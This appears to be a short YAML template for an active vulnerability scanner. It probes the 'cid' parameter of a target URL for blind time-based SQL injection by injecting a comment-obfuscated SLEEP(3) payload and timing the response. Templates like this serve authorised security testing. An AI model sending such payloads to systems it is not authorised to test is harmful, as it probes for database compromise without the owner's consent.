id: sqli-time3-028
name: 'Delay probe in cid'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via cid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cid:
        - ''';SELECT/**/SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
